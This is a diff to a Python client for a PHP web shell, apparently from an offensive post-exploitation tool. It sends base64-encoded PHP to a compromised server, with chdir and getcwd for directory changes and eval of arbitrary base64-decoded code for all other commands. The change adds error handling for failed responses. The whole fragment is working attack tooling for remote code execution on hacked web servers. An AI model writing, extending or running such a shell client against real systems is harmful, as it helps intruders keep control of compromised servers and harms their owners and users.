@@ -25,8 +25,13 @@ def run():
         b64_pwd = base64_encode(pwd)
         if (lower_data.startswith("cd ") and len(lower_data) > 3):
             path = base64_encode(lower_data[3:].strip())
-            pwd = send(f'chdir(base64_decode(\'{b64_pwd}\'));chdir(base64_decode(\'{path}\'));print(getcwd());').r_text.strip()
+            res = send(f'chdir(base64_decode(\'{b64_pwd}\'));chdir(base64_decode(\'{path}\'));print(getcwd());')
+            if (not res):
+                return
+            pwd = res.r_text.strip()
         else:
-            req = send(f'eval("chdir(base64_decode(\'{b64_pwd}\'));eval(base64_decode(\'{data}\'));");')
-            print("\n" + req.r_text.strip() + "\n")
+            res = send(f'eval("chdir(base64_decode(\'{b64_pwd}\'));eval(base64_decode(\'{data}\'));");')
+            if (not res):
+                return
+            print("\n" + res.r_text.strip() + "\n")
     set_namespace("webshell", False)
